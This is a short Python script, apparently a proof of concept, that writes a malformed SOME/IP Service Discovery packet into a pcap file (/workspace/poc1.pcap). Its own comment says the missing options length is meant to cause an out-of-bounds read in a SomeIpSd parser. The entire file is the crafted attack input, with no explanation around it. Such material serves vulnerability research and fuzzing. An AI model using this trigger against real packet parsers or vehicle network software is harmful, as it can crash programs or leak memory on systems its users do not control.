import struct, socket
payload = b''
payload += struct.pack('!HHIHHBBBB', 0xffff,0x8100,16,0,1,1,1,0x02,0)
payload += b'\x00\x00\x00\x00' # flags/reserved
payload += struct.pack('!I',0) # len entries
# no len options -> OOB read if parsed as SomeIpSd
udp_len=8+len(payload)
ip_total=20+udp_len
eth = b'\x02\x00\x00\x00\x00\x01' + b'\x02\x00\x00\x00\x00\x02' + struct.pack('!H',0x0800)
ip = struct.pack('!BBHHHBBH4s4s',0x45,0,ip_total,0,0,64,17,0,socket.inet_aton('1.1.1.1'),socket.inet_aton('2.2.2.2'))
# compute ip checksum
def csum(data):
    if len(data)%2: data+=b'\0'
    s=sum(int.from_bytes(data[i:i+2],'big') for i in range(0,len(data),2))
    while s>>16: s=(s&0xffff)+(s>>16)
    return (~s)&0xffff
ip = ip[:10]+struct.pack('!H',csum(ip))+ip[12:]
udp = struct.pack('!HHHH',30490,30490,udp_len,0)
packet=eth+ip+udp+payload
pcap = struct.pack('<IHHIIII',0xa1b2c3d4,2,4,0,0,65535,1)
pcap += struct.pack('<IIII',0,0,len(packet),len(packet))+packet
open('/workspace/poc1.pcap','wb').write(pcap)
print(len(payload), len(packet), len(pcap))
print(payload.hex())
